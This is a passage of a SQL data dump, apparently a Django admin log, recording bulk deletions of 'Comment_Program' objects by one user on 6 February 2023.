(16845)',3,'',24,2),(1328,'2023-02-06 15:26:59.748233','16844','Comment_Program object (16844)',3,'',24,2),(1329,'2023-02-06 15:26:59.749629','16843','Comment_Program object (16843)',3,'',24,2),(1330,'2023-02-06 15:26:59.750983','16842','Comment_Program object (16842)',3,'',24,2),(1331,'2023-02-06 15:26:59.752181','16841','Comment_Program object (16841)',3,'',24,2),(1332,'2023-02-06 15:26:59.753319','16840','Comment_Program object (16840)',3,'',24,2),(1333,'2023-02-06 15:26:59.754359','16839','Comment_Program object (16839)',3,'',24,2),(1334,'2023-02-06 15:26:59.755555','16838','Comment_Program object (16838)',3,'',24,2),(1335,'2023-02-06 15:26:59.756928','16837','Comment_Program object (16837)',3,'',24,2),(1336,'2023-02-06 15:26:59.761458','16836','Comment_Program object (16836)',3,'',24,2),(1337,'2023-02-06 15:26:59.762874','16835','Comment_Program object (16835)',3,'',24,2),(1338,'2023-02-06 15:26:59.764252','16834','Comment_Program object (16834)',3,'',24,2),(1339,'2023-02-06 15:26:59.765698','16833','Comment_Program object (16833)',3,'',24,2),(1340,'2023-02-06 15:26:59.766953','16832','Comment_Program object (16832)',3,'',24,2),(1341,'2023-02-06 15:26:59.768305','16831','Comment_Program object (16831)',3,'',24,2),(1342,'2023-02-06 15:26:59.769604','16830','Comment_Program object (16830)',3,'',24,2),(1343,'2023-02-06 15:26:59.770783','16829','Comment_Program object (16829)',3,'',24,2),(1344,'2023-02-06 15:26:59.771989','16828','Comment_Program object (16828)',3,'',24,2),(1345,'2023-02-06 15:26:59.773776','16827','Comment_Program object (16827)',3,'',24,2),(1346,'2023-02-06 15:26:59.775069','16826','Comment_Program object (16826)',3,'',24,2),(1347,'2023-02-06 15:26:59.776299','16825','Comment_Program object (16825)',3,'',24,2),(1348,'2023-02-06 15:26:59.777433','16824','Comment_Program object (16824)',3,'',24,2),(1349,'2023-02-06 15:26:59.778757','16823','Comment_Program object (16823)',3,'',24,2),(1350,'2023-02-06 15:26:59.780073','16822','Comment_Program object (16822)',3,'',24,2),(1351,'2023-02-06 15:26:59.781360','16821','Comment_Program object (16821)',3,'',24,2),(1352,'2023-02-06 15:26:59.782603','16820','Comment_Program object (16820)',3,'',24,2),(1353,'2023-02-06 15:26:59.784609','16819','Comment_Program object (16819)',3,'',24,2),(1354,'2023-02-06 15:26:59.786213','16818','Comment_Program object (16818)',3,'',24,2),(1355,'2023-02-06 15:26:59.787666','16817','Comment_Program object (16817)',3,'',24,2),(1356,'2023-02-06 15:26:59.789273','16816','Comment_Program object (16816)',3,'',24,2),(1357,'2023-02-06 15:26:59.790566','16815','Comment_Program object (16815)',3,'',24,2),(1358,'2023-02-06 15:26:59.791788','16814','Comment_Program object (16814)',3,'',24,2),(1359,'2023-02-06 15:26:59.793058','16813','Comment_Program object (16813)',3,'',24,2),(1360,'2023-02-06 15:26:59.794394','16812','Comment_Program object (16812)',3,'',24,2),(1361,'2023-02-06 15:26:59.795645','16811','Comment_Program object (16811)',3,'',24,2),(1362,'2023-02-06 15:26:59.797547','16810','Comment_Program object (16810)',3,'',24,2),(1363,'2023-02-06 15:26:59.798860','16809','Comment_Program object (16809)',3,'',24,2),(1364,'2023-02-06 15:26:59.800278','16808','Comment_Program object (16808)',3,'',24,2),(1365,'2023-02-06 15:26:59.801707','16807','Comment_Program object (16807)',3,'',24,2),(1366,'2023-02-06 15:26:59.803115','16806','Comment_Program object (16806)',3,'',24,2),(1367,'2023-02-06 15:26:59.804461','16805','Comment_Program object (16805)',3,'',24,2),(1368,'2023-02-06 15:26:59.806004','16804','Comment_Program object (16804)',3,'',24,2),(1369,'2023-02-06 15:26:59.807575','16803','Comment_Program object (16803)',3,'',24,2),(1370,'2023-02-06 15:26:59.809083','16802','Comment_Program object (16802)',3,'',24,2),(1371,'2023-02-06 15:26:59.811384','16801','Comment_Program object (16801)',3,'',24,2),(1372,'2023-02-06 15:26:59.812836','16800','Comment_Program object (16800)',3,'',24,2),(1373,'2023-02-06 15:26:59.814342','16799','Comment_Program object (16799)',3,'',24,2),(1374,'2023-02-06 15:26:59.815705','16798','Comment_Program object (16798)',3,'',24,2),(1375,'2023-02-06 15:26:59.817045','16797','Comment_Program object (16797)',3,'',24,2),(1376,'2023-02-06 15:26:59.818334','16796','Comment_Program object (16796)',3,'',24,2),(1377,'2023-02-06 15:26:59.819531','16795','Comment_Program object (16795)',3,'',24,2),(1378,'2023-02-06 15:26:59.820812','16794','Comment_Program object (16794)',3,'',24,2),(1379,'2023-02-06 15:26:59.822216','16793','Comment_Program object (16793)',3,'',24,2),(1380,'2023-02-06 15:26:59.824133','16792','Comment_Program object (16792)',3,'',24,2),(1381,'2023-02-06 15:26:59.825569','16791','Comment_Program object (16791)',3,'',24,2),(1382,'2023-02-06 15:26:59.826904','16790','Comment_Program object (16790)',3,'',24,2),(1383,'2023-02-06 15:26:59.828579','16789','Comment_Program object (16789)',3,'',24,2),(1384,'2023-02-06 15:26:59.829914','16788','Comment_Program object (16788)',3,'',24,2),(1385,'2023-02-06 15:26:59.831221','16787','Comment_Program object (16787)',3,'',24,2),(1386,'2023-02-06 15:26:59.832679','16786','Comment_Program object (16786)',3,'',24,2),(1387,'2023-02-06 15:26:59.834199','16785','Comment_Program object (16785)',3,'',24,2),(1388,'2023-02-06 15:26:59.835668','16784','Comment_Program object (16784)',3,'',24,2),(1389,'2023-02-06 15:26:59.837851','16783','Comment_Program object (16783)',3,'',24,2),(1390,'2023-02-06 15:26:59.839303','16782','Comment_Program object (16782)',3,'',24,2),(1391,'2023-02-06 15:26:59.840686','16781','Comment_Program object (16781)',3,'',24,2),(1392,'2023-02-06 15:26:59.841938','16780','Comment_Program object (16780)',3,'',24,2),(1393,'2023-02-06 15:26:59.843098','16779','Comment_Program object (16779)',3,'',24,2),(1394,'2023-02-06 15:26:59.844246','16778','Comment_Program object (16778)',3,'',24,2),(1395,'2023-02-06 15:26:59.845829','16777','Comment_Program object (16777)',3,'',24,2),(1396,'2023-02-06 15:26:59.847191','16776','Comment_Program object (16776)',3,'',24,2),(1397,'2023-02-06 15:26:59.848768','16775','Comment_Program object (16775)',3,'',24,2),(1398,'2023-02-06 15:26:59.850729','16774','Comment_Program object (16774)',3,'',24,2),(1399,'2023-02-06 15:26:59.852161','16773','Comment_Program object (16773)',3,'',24,2),(1400,'2023-02-06 15:26:59.853612','16772','Comment_Program object (16772)',3,'',24,2),(1401,'2023-02-06 15:26:59.854866','16771','Comment_Program object (16771)',3,'',24,2),(1402,'2023-02-06 15:26:59.856249','16770','Comment_Program object (16770)',3,'',24,2),(1403,'2023-02-06 15:26:59.857559','16769','Comment_Program object (16769)',3,'',24,2),(1404,'2023-02-06 15:26:59.858725','16768','Comment_Program object (16768)',3,'',24,2),(1405,'2023-02-06 15:26:59.859904','16767','Comment_Program object (16767)',3,'',24,2),(1406,'2023-02-06 15:26:59.861199','16766','Comment_Program object (16766)',3,'',24,2),(1407,'2023-02-06 15:26:59.862960','16765','Comment_Program object (16765)',3,'',24,2),(1408,'2023-02-06 15:26:59.864477','16764','Comment_Program object (16764)',3,'',24,2),(1409,'2023-02-06 15:26:59.866250','16763','Comment_Program object (16763)',3,'',24,2),(1410,'2023-02-06 15:26:59.867585','16762','Comment_Program object (16762)',3,'',24,2),(1411,'2023-02-06 15:26:59.869014','16761','Comment_Program object (16761)',3,'',24,2),(1412,'2023-02-06 15:26:59.870622','16760','Comment_Program object (16760)',3,'',24,2),(1413,'2023-02-06 15:27:27.815051','10047','Comment_Program object (10047)',3,'',24,2),(1414,'2023-02-06 15:27:27.817647','10048','Comment_Program object (10048)',3,'',24,2),(1415,'2023-02-06 15:27:27.819228','4857','Comment_Program object (4857)',3,'',24,2),(1416,'2023-02-06 15:27:27.820675','4809','Comment_Program object (4809)',3,'',24,2),(1417,'2023-02-06 15:27:27.822131','2417','Comment_Program object (2417)',3,'',24,2),(1418,'2023-02-06 15:27:27.823493','13907','Comment_Program object (13907)',3,'',24,2),(1419,'2023-02-06 15:27:27.824992','5916','Comment_Program object (5916)',3,'',24,2),(1420,'2023-02-06 15:27:27.826262','1936','Comment_Program object (1936)',3,'',24,2),(1421,'2023-02-06 15:27:27.828511','2061','Comment_Program object (2061)',3,'',24,2),(1422,'2023-02-06 15:27:27.829872','113','Comment_Program object (113)',3,'',24,2),(1423,'2023-02-06 15:27:27.831282','11930','Comment_Program object (11930)',3,'',24,2),(1424,'2023-02-06 15:27:27.832846','8401','Comment_Program object (8401)',3,'',24,2),(1425,'2023-02-06 15:27:27.834085','6721','Comment_Program object (6721)',3,'',24,2),(1426,'2023-02-06 15:27:27.835442','2892','Comment_Program object (2892)',3,'',24,2),(1427,'2023-02-06 15:27:27.836844','7197','Comment_Program object (7197)',3,'',24,2),(1428,'2023-02-06 15:27:27.838267','747','Comment_Program object (747)',3,'',24,2),(1429,'2023-02-06 15:27:27.839596','6983','Comment_Program object (6983)',3,'',24,2),(1430,'2023-02-06 15:27:27.841589','9643','Comment_Program object (9643)',3,'',24,2),(1431,'2023-02-06 15:27:27.843321','8500','Comment_Program object (8500)',3,'',24,2),(1432,'2023-02-06 15:27:27.845121','3029','Comment_Program object (3029)',3,'',24,2),(1433,'2023-02-06 15:27:27.847170','2697','Comment_Program object (2697)',3,'',24,2),(1434,'2023-02-06 15:27:27.849195','9817','Comment_Program object (9817)',3,'',24,2),(1435,'2023-02-06 15:27:27.850410','8903','Comment_Program object (8903)',3,'',24,2),(1436,'2023-02-06 15:27:27.851680','5553','Comment_Program object (5553)',3,'',24,2),(1437,'2023-02-06 15:27:27.852852','16309','Comment_Program object (16309)',3,'',24,2),(1438,'2023-02-06 15:27:27.853997','16007','Comment_Program object (16007)',3,'',24,2),(1439,'2023-02-06 15:27:27.855885','5243','Comment_Program object (5243)',3,'',24,2),(1440,'2023-02-06 15:27:27.857137','4845','Comment_Program object (4845)',3,'',24,2),(1441,'2023-02-06 15:27:27.858397','6340','Comment_Program object (6340)',3,'',24,2),(1442,'2023-02-06 15:27:27.859647','511','Comment_Program object (511)',3,'',24,2),(1443,'2023-02-06 15:27:27.861182','13664','Comment_Program object (13664)',3,'',24,2),(1444,'2023-02-06 15:27:27.862761','3609','Comment_Program object (3609)',3,'',24,2),(1445,'2023-02-06 15:27:27.863990','16050','Comment_Program object (16050)',3,'',24,2),(1446,'2023-02-06 15:27:27.865342','8820','Comment_Program object (8820)',3,'',24,2),(1447,'2023-02-06 15:27:27.866745','9270','Comment_Program object (9270)',3,'',24,2),(1448,'2023-02-06 15:27:27.868406','5776','Comment_Program object (5776)',3,'',24,2),(1449,'2023-02-06 15:27:27.869991','6255','Comment_Program object (6255)',3,'',24,2),(1450,'2023-02-06 15:27:27.871289','12011','Comment_Program object (12011)',3,'',24,2),(1451,'2023-02-06 15:27:27.872546','774','Comment_Program object (774)',3,'',24,2),(1452,'2023-02-06 15:27:27.873819','9535','Comment_Program object (9535)',3,'',24,2),(1453,'2023-02-06 15:27:27.875128','6505','Comment_Program object (6505)',3,'',24,2),(1454,'2023-02-06 15:27:27.876417','6264','Comment_Program object (6264)',3,'',24,2),(1455,'2023-02-06 15:27:27.877807','13776','Comment_Program object (13776)',3,'',24,2),(1456,'2023-02-06 15:27:27.879051','10688','Comment_Program object (10688)',3,'',24,2),(1457,'2023-02-06 15:27:27.881013','3974','Comment_Program object (3974)',3,'',24,2),(1458,'2023-02-06 15:27:27.882304','2882','Comment_Program object (2882)',3,'',24,2),(1459,'2023-02-06 15:27:27.883629','855','Comment_Program object (855)',3,'',24,2),(1460,'2023-02-06 15:27:27.885074','13855','Comment_Program object (13855)',3,'',24,2),(1461,'2023-02-06 15:27:27.886315','12250','Comment_Program object (12250)',3,'',24,2),(1462,'2023-02-06 15:27:27.887504','11743','Comment_Program object (11743)',3,'',24,2),(1463,'2023-02-06 15:27:27.888652','8430','Comment_Program object (8430)',3,'',24,2),(1464,'2023-02-06 15:27:27.889756','13399','Comment_Program object (13399)',3,'',24,2),(1465,'2023-02-06 15:27:27.890833','8695','Comment_Program object (8695)',3,'',24,2),(1466,'2023-02-06 15:27:27.892632','4294','Comment_Program object (4294)',3,'',24,2),(1467,'2023-02-06 15:27:27.893834','12706','Comment_Program object (12706)',3,'',24,2),(1468,'2023-02-06 15:27:27.895142','9180','Comment_Program object (9180)',3,'',24,2),(1469,'2023-02-06 15:27:27.896345','10055','Comment_Program object (10055)',3,'',24,2),(1470,'2023-02-06 15:27:27.897557','945','Comment_Program object (945)',3,'',24,2),(1471,'2023-02-06 15:27:27.898805','1095','Comment_Program object (1095)',3,'',24,2),(1472,'2023-02-06 15:27:27.900025','10064','Comment_Program object (10064)',3,'',24,2),(1473,'2023-02-06 15:27:27.901423','13696','Comment_Program object (13696)',3,'',24,2),(1474,'2023-02-06 15:27:27.902596','5342','Comment_Program object (5342)',3,'',24,2),(1475,'2023-02-06 15:27:27.904333','16235','Comment_Program object (16235)',3,'',24,2),(1476,'2023-02-06 15:27:27.905541','15435','Comment_Program object (15435)',3,'',24,2),(1477,'2023-02-06 15:27:27.906867','2656','Comment_Program object (2656)',3,'',24,2),(1478,'2023-02-06 15:27:27.908049','10620','Comment_Program object (10620)',3,'',24,2),(1479,'2023-02-06 15:27:27.909028','8665','Comment_Program object (8665)',3,'',24,2),(1480,'2023-02-06 15:27:27.910116','12370','Comment_Program object (12370)',3,'',24,2),(1481,'2023-02-06 15:27:27.911312','77','Comment_Program object (77)',3,'',24,2),(1482,'2023-02-06 15:27:27.912578','5235','Comment_Program object (5235)',3,'',24,2),(1483,'2023-02-06 15:27:27.913858','3353','Comment_Program object (3353)',3,'',24,2),(1484,'2023-02-06 15:27:27.915725','1674','Comment_Program object (1674)',3,'',24,2),(1485,'2023-02-06 15:27:27.917029','7153','Comment_Program object (7153)',3,'',24,2),(1486,'2023-02-06 15:27:27.918202','13803','Comment_Program object (13803)',3,'',24,2),(1487,'2023-02-06 15:27:27.919415','7764','Comment_Program object (7764)',3,'',24,2),(1488,'2023-02-06 15:27:27.920941','9957','Comment_Program object (9957)',3,'',24,2),(1489,'2023-02-06 15:27:27.922272','3522','Comment_Program object (3522)',3,'',24,2),(1490,'2023-02-06 15:27:27.923478','4920','Comment_Program object (4920)',3,'',24,2),(1491,'2023-02-06 15:27:27.924762','16272','Comment_Program object (16272)',3,'',24,2),(1492,'2023-02-06 15:27:27.926073','8417','Comment_Program object (8417)',3,'',24,2),(1493,'2023-02-06 15:27:27.928073','7822','Comment_Program object (7822)',3,'',24,2),(1494,'2023-02-06 15:27:27.929446','8671','Comment_Program object (8671)',3,'',24,2),(1495,'2023-02-06 15:27:27.930767','2601','Comment_Program object (2601)',3,'',24,2),(1496,'2023-02-06 15:27:27.931954','15629','Comment_Program object (15629)',3,'',24,2),(1497,'2023-02-06 15:27:27.933194','8544','Comment_Program object (8544)',3,'',24,2),(1498,'2023-02-06 15:27:27.934352','3184','Comment_Program object (3184)',3,'',24,2),(1499,'2023-02-06 15:27:27.935533','6163','Comment_Program object (6163)',3,'',24,2),(1500,'2023-02-06 15:27:27.936802','1849','Comment_Program object (1849)',3,'',24,2),(1501,'2023-02-06 15:27:27.939579','13831','Comment_Program object (13831)',3,'',24,2),(1502,'2023-02-06 15:27:27.944053','12520','Comment_Program object (12520)',3,'',24,2),(1503,'2023-02-06 15:27:27.947585','11091','Comment_Program object (11091)',3,'',24,2),(1504,'2023-02-06 15:27:27.951477','3617','Comment_Program object (3617)',3,'',24,2),(1505,'2023-02-06 15:27:27.955344','1267','Comment_Program object (1267)',3,'',24,2),(1506,'2023-02-06 15:27:27.956877','12770','Comment_Program object (12770)',3,'',24,2),(1507,'2023-02-06 15:27:27.958151','7598','Comment_Program object (7598)',3,'',24,2),(1508,'2023-02-06 15:27:27.959484','14430','Comment_Program object (14430)',3,'',24,2),(1509,'2023-02-06 15:27:27.965320','7566','Comment_Program object (7566)',3,'',24,2),(1510,'2023-02-06 15:27:27.966820','5385','Comment_Program object (5385)',3,'',24,2),(1511,'2023-02-06 15:27:27.968844','14569','Comment_Program object (14569)',3,'',24,2),(1512,'2023-02-06 15:27:27.970029','7830','Comment_Program object (7830)',3,'',24,2),(1513,'2023-02-06 15:27:36.446444','3114','Comment_Program object (3114)',3,'',24,2),(1514,'2023-02-06 15:27:36.448946','15692','Comment_Program object (15692)',3,'',24,2),(1515,'2023-02-06 15:27:36.450638','9554','Comment_Program object (9554)',3,'',24,2),(1516,'2023-02-06 15:27:36.452088','13254','Comment_Program object (13254)',3,'',24,2),(1517,'2023-02-06 15:27:36.453621','10162','Comment_Program object (10162)',3,'',24,2),(1518,'2023-02-06 15:27:36.454991','13392','Comment_Program object (13392)',3,'',24,2),(1519,'2023-02-06 15:27:36.458283','3872','Comment_Program object (3872)',3,'',24,2),(1520,'2023-02-06 15:27:36.459553','16417','Comment_Program object (16417)',3,'',24,2),(1521,'2023-02-06 15:27:36.460926','16268','Comment_Program object (16268)',3,'',24,2),(1522,'2023-02-06 15:27:36.461901','10496','Comment_Program object (10496)',3,'',24,2),(1523,'2023-02-06 15:27:36.462969','15607','Comment_Program object (15607)',3,'',24,2),(1524,'2023-02-06 15:27:36.464043','8909','Comment_Program object (8909)',3,'',24,2),(1525,'2023-02-06 15:27:36.465088','13308','Comment_Program object (13308)',3,'',24,2),(1526,'2023-02-06 15:27:36.466092','8753','Comment_Program object (8753)',3,'',24,2),(1527,'2023-02-06 15:27:36.467117','5632','Comment_Program object (5632)',3,'',24,2),(1528,'2023-02-06 15:27:36.469124','15040','Comment_Program object (15040)',3,'',24,2),(1529,'2023-02-06 15:27:36.470163','6050','Comment_Program object (6050)',3,'',24,2),(1530,'2023-02-06 15:27:36.471120','3474','Comment_Program object (3474)',3,'',24,2),(1531,'2023-02-06 15:27:36.472068','12919','Comment_Program object (12919)',3,'',24,2),(1532,'2023-02-06 15:27:36.473139','10473','Comment_Program object (10473)',3,'',24,2),(1533,'2023-02-06 15:27:36.474114','8140','Comment_Program object (8140)',3,'',24,2),(1534,'2023-02-06 15:27:36.475314','986','Comment_Program object (986)',3,'',24,2),(1535,'2023-02-06 15:27:36.476630','2947','Comment_Program object (2947)',3,'',24,2),(1536,'2023-02-06 15:27:36.478486','12541','Comment_Program object (12541)',3,'',24,2),(1537,'2023-02-06 15:27:36.479486','3309','Comment_Program object (3309)',3,'',24,2),(1538,'2023-02-06 15:27:36.480650','13535','Comment_Program object (13535)',3,'',24,2),(1539,'2023-02-06 15:27:36.481635','12701','Comment_Program object (12701)',3,'',24,2),(1540,'2023-02-06 15:27:36.482624','7083','Comment_Program object (7083)',3,'',24,2),(1541,'2023-02-06 15:27:36.483664','13567','Comment_Program object (13567)',3,'',24,2),(1542,'2023-02-06 15:27:36.484836','11608','Comment_Program object (11608)',3,'',24,2),(1543,'2023-02-06 15:27:36.485805','11115','Comment_Program object (11115)',3,'',24,2),(1544,'2023-02-06 15:27:36.486767','16020','Comment_Program object (16020)',3,'',24,2),(1545,'2023-02-06 15:27:36.488429','14528','Comment_Program object (14528)',3,'',24,2),(1546,'2023-02-06 15:27:36.489512','7294','Comment_Program object (7294)',3,'',24,2),(1547,'2023-02-06 15:27:36.490468','894','Comment_Program object (894)',3,'',24,2),(1548,'2023-02-06 15:27:36.491391','7297','Comment_Program object (7297)',3,'',24,2),(1549,'2023-02-06 15:27:36.492524','364','Comment_Program object (364)',3,'',24,2),(1550,'2023-02-06 15:27:36.493502','1447','Comment_Program object (1447)',3,'',24,2),(1551,'2023-02-06 15:27:36.494504','12639','Comment_Program object (12639)',3,'',24,2),(1552,'2023-02-06 15:27:36.495523','16434','Comment_Program object (16434)',3,'',24,2),(1553,'2023-02-06 15:27:36.496572','12832','Comment_Program object (12832)',3,'',24,2),(1554,'2023-02-06 15:27:36.498249','3592','Comment_Program object (3592)',3,'',24,2),(1555,'2023-02-06 15:27:36.499208','15761','Comment_Program object (15761)',3,'',24,2),(1556,'2023-02-06 15:27:36.500323','5004','Comment_Program object (5004)',3,'',24,2),(1557,'2023-02-06 15:27:36.501380','8179','Comment_Program object (8179)',3,'',24,2),(1558,'2023-02-06 15:27:36.502479','13768','Comment_Program object (13768)',3,'',24,2),(1559,'2023-02-06 15:27:36.503492','6276','Comment_Program object (6276)',3,'',24,2),(1560,'2023-02-06 15:27:36.504614','8185','Comment_Program object (8185)',3,'',24,2),(1561,'2023-02-06 15:27:36.505586','5781','Comment_Program object (5781)',3,'',24,2),(1562,'2023-02-06 15:27:36.506517','15715','Comment_Program object (15715)',3,'',24,2),(1563,'2023-02-06 15:27:36.508640','12363','Comment_Program object (12363)',3,'',24,2),(1564,'2023-02-06 15:27:36.509883','7520','Comment_Program object (7520)',3,'',24,2),(1565,'2023-02-06 15:27:36.510867','12630','Comment_Program object (12630)',3,'',24,2),(1566,'2023-02-06 15:27:36.511943','12330','Comment_Program object (12330)',3,'',24,2),(1567,'2023-02-06 15:27:36.512893','10167','Comment_Program object (10167)',3,'',24,2),(1568,'2023-02-06 15:27:36.513849','7227','Comment_Program object (7227)',3,'',24,2),(1569,'2023-02-06 15:27:36.514765','11180','Comment_Program object (11180)',3,'',24,2),(1570,'2023-02-06 15:27:36.515664','3766','Comment_Program object (3766)',3,'',24,2),(1571,'2023-02-06 15:27:36.516692','4888','Comment_Program object (4888)',3,'',24,2),(1572,'2023-02-06 15:27:36.518579','1892','Comment_Program object (1892)',3,'',24,2),(1573,'2023-02-06 15:27:36.519558','3649','Comment_Program object (3649)',3,'',24,2),(1574,'2023-02-06 15:27:36.520589','6389','Comment_Program object (6389)',3,'',24,2),(1575,'2023-02-06 15:27:36.521672','9480','Comment_Program object (9480)',3,'',24,2),(1576,'2023-02-06 15:27:36.522666','445','Comment_Program object (445)',3,'',24,2),(1577,'2023-02-06 15:27:36.523623','643','Comment_Program object (643)',3,'',24,2),(1578,'2023-02-06 15:27:36.524651','4591','Comment_Program object (4591)',3,'',24,2),(1579,'2023-02-06 15:27:36.525610','1326','Comment_Program object (1326)',3,'',24,2),(1580,'2023-02-06 15:27:36.526558','321','Comment_Program object (321)',3,'',24,2),(1581,'2023-02-06 15:27:36.528416','11760','Comment_Program object (11760)',3,'',24,2),(1582,'2023-02-06 15:27:36.529529','9371','Comment_Program object (9371)',3,'',24,2),(1583,'2023-02-06 15:27:36.530645','16121','Comment_Program object (16121)',3,'',24,2),(1584,'2023-02-06 15:27:36.531602','13652','Comment_Program object (13652)',3,'',24,2),(1585,'2023-02-06 15:27:36.532584','16515','Comment_Program object (16515)',3,'',24,2),(1586,'2023-02-06 15:27:36.533552','383','Comment_Program object (383)',3,'',24,2),(1587,'2023-02-06 15:27:36.534518','11188','Comment_Program object (11188)',3,'',24,2),(1588,'2023-02-06 15:27:36.535452','8484','Comment_Program object (8484)',3,'',24,2),(1589,'2023-02-06 15:27:36.536486','5584','Comment_Program object (5584)',3,'',24,2),(1590,'2023-02-06 15:27:36.538193','12003','Comment_Program object (12003)',3,'',24,2),(1591,'2023-02-06 15:27:36.539194','5905','Comment_Program object (5905)',3,'',24,2),(1592,'2023-02-06 15:27:36.540315','2561','Comment_Program object (2561)',3,'',24,2),(1593,'2023-02-06 15:27:36.541438','73','Comment_Program object (73)',3,'',24,2),(1594,'2023-02-06 15:27:36.542396','3734','Comment_Program object (3734)',3,'',24,2),(1595,'2023-02-06 15:27:36.543332','260','Comment_Program object (260)',3,'',24,2),(1596,'2023-02-06 15:27:36.544272','7106','Comment_Program object (7106)',3,'',24,2),(1597,'2023-02-06 15:27:36.545209','3342','Comment_Program object (3342)',3,'',24,2),(1598,'2023-02-06 15:27:36.546099','13418','Comment_Program object (13418)',3,'',24,2),(1599,'2023-02-06 15:27:36.547625','14696','Comment_Program object (14696)',3,'',24,2),(1600,'2023-02-06 15:27:36.548640','10875','Comment_Program object (10875)',3,'',24,2),(1601,'2023-02-06 15:27:36.549662','5312','Comment_Program object (5312)',3,'',24,2),(1602,'2023-02-06 15:27:36.550648','4584','Comment_Program object (4584)',3,'',24,2),(1603,'2023-02-06 15:27:36.551791','10172','Comment_Program object (10172)',3,'',24,2),(1604,'2023-02-06 15:27:36.552736','16276','Comment_Program object (16276)',3,'',24,2),(1605,'2023-02-06 15:27:36.553673','13686','Comment_Program object (13686)',3,'',24,2),(1606,'2023-02-06 15:27:36.554611','10611','Comment_Program object (10611)',3,'',24,2),(1607,'2023-02-06 15:27:36.555547','10156','Comment_Program object (10156)',3,'',24,2),(1608,'2023-02-06 15:27:36.557224','9989','Comment_Program object (9989)',3,'',24,2),(1609,'2023-02-06 15:27:36.558285','1059','Comment_Program object (1059)',3,'',24,2),(1610,'2023-02-06 15:27:36.559208','11785','Comment_Program object (11785)',3,'',24,2),(1611,'2023-02-06 15:27:36.560182','7012','Comment_Program object (7012)',3,'',24,2),(1612,'2023-02-06 15:27:36.561167','10684','Comment_Program object (10684)',3,'',24,2),(1613,'2023-02-06 15:27:47.757217','14471','Comment_Program object (14471)',3,'',24,2),(1614,'2023-02-06 15:27:47.759356','9580','Comment_Program object (9580)',3,'',24,2),(1615,'2023-02-06 15:27:47.760722','11750','Comment_Program object (11750)',3,'',24,2),(1616,'2023-02-06 15:27:47.763459','6332','Comment_Program object (6332)',3,'',24,2),(1617,'2023-02-06 15:27:47.764726','5037','Comment_Program object (5037)',3,'',24,2),(1618,'2023-02-06 15:27:47.765783','1156','Comment_Program object (1156)',3,'',24,2),(1619,'2023-02-06 15:27:47.766763','9680','Comment_Program object (9680)',3,'',24,2),(1620,'2023-02-06 15:27:47.767695','2077','Comment_Program object (2077)',3,'',24,2),(1621,'2023-02-06 15:27:47.768686','2971','Comment_Program object (2971)',3,'',24,2),(1622,'2023-02-06 15:27:47.769635','15919','Comment_Program object (15919)',3,'',24,2),(1623,'2023-02-06 15:27:47.770626','7952','Comment_Program object (7952)',3,'',24,2),(1624,'2023-02-06 15:27:47.771548','650','Comment_Program object (650)',3,'',24,2),(1625,'2023-02-06 15:27:47.773311','14606','Comment_Program object (14606)',3,'',24,2),(1626,'2023-02-06 15:27:47.774423','10382','Comment_Program object (10382)',3,'',24,2),(1627,'2023-02-06 15:27:47.775335','1469','Comment_Program object (1469)',3,'',24,2),(1628,'2023-02-06 15:27:47.776395','8104','Comment_Program object (8104)',3,'',24,2),(1629,'2023-02-06 15:27:47.777571','14823','Comment_Program object (14823)',3,'',24,2),(1630,'2023-02-06 15:27:47.778566','8850','Comment_Program object (8850)',3,'',24,2),(1631,'2023-02-06 15:27:47.779517','7032','Comment_Program object (7032)',3,'',24,2),(1632,'2023-02-06 15:27:47.780523','6459','Comment_Program object (6459)',3,'',24,2),(1633,'2023-02-06 15:27:47.781541','3996','Comment_Program object (3996)',3,'',24,2),(1634,'2023-02-06 15:27:47.783297','2872','Comment_Program object (2872)',3,'',24,2),(1635,'2023-02-06 15:27:47.784368','9996','Comment_Program object (9996)',3,'',24,2),(1636,'2023-02-06 15:27:47.785397','4077','Comment_Program object (4077)',3,'',24,2),(1637,'2023-02-06 15:27:47.786358','15569','Comment_Program object (15569)',3,'',24,2),(1638,'2023-02-06 15:27:47.787305','10442','Comment_Program object (10442)',3,'',24,2),(1639,'2023-02-06 15:27:47.788224','2192','Comment_Program object (2192)',3,'',24,2),(1640,'2023-02-06 15:27:47.789169','2685','Comment_Program object (2685)',3,'',24,2),(1641,'2023-02-06 15:27:47.790111','12815','Comment_Program object (12815)',3,'',24,2),(1642,'2023-02-06 15:27:47.791028','12760','Comment_Program object (12760)',3,'',24,2),(1643,'2023-02-06 15:27:47.792866','4590','Comment_Program object (4590)',3,'',24,2),(1644,'2023-02-06 15:27:47.793850','13198','Comment_Program object (13198)',3,'',24,2),(1645,'2023-02-06 15:27:47.794821','206','Comment_Program object (206)',3,'',24,2),(1646,'2023-02-06 15:27:47.795756','16154','Comment_Program object (16154)',3,'',24,2),(1647,'2023-02-06 15:27:47.796718','14777','Comment_Program object (14777)',3,'',24,2),(1648,'2023-02-06 15:27:47.797924','4176','Comment_Program object (4176)',3,'',24,2),(1649,'2023-02-06 15:27:47.803791','12895','Comment_Program object (12895)',3,'',24,2),(1650,'2023-02-06 15:27:47.805569','13490','Comment_Program object (13490)',3,'',24,2),(1651,'2023-02-06 15:27:47.806695','11625','Comment_Program object (11625)',3,'',24,2),(1652,'2023-02-06 15:27:47.808733','7255','Comment_Program object (7255)',3,'',24,2),(1653,'2023-02-06 15:27:47.809965','2001','Comment_Program object (2001)',3,'',24,2),(1654,'2023-02-06 15:27:47.811189','3950','Comment_Program object (3950)',3,'',24,2),(1655,'2023-02-06 15:27:47.812538','9264','Comment_Program object (9264)',3,'',24,2),(1656,'2023-02-06 15:27:47.813674','5486','Comment_Program object (5486)',3,'',24,2),(1657,'2023-02-06 15:27:47.814972','9893','Comment_Program object (9893)',3,'',24,2),(1658,'2023-02-06 15:27:47.816147','14100','Comment_Program object (14100)',3,'',24,2),(1659,'2023-02-06 15:27:47.821116','9810','Comment_Program object (9810)',3,'',24,2),(1660,'2023-02-06 15:27:47.825290','14850','Comment_Program object (14850)',3,'',24,2),(1661,'2023-02-06 15:27:47.827564','3527','Comment_Program object (3527)',3,'',24,2),(1662,'2023-02-06 15:27:47.828805','4477','Comment_Program object (4477)',3,'',24,2),(1663,'2023-02-06 15:27:47.829834','15492','Comment_Program object (15492)',3,'',24,2),(1664,'2023-02-06 15:27:47.830795','726','Comment_Program object (726)',3,'',24,2),(1665,'2023-02-06 15:27:47.831805','2413','Comment_Program object (2413)',3,'',24,2),(1666,'2023-02-06 15:27:47.832902','12473','Comment_Program object (12473)',3,'',24,2),(1667,'2023-02-06 15:27:47.833892','1165','Comment_Program object (1165)',3,'',24,2),(1668,'2023-02-06 15:27:47.834898','15403','Comment_Program object (15403)',3,'',24,2),(1669,'2023-02-06 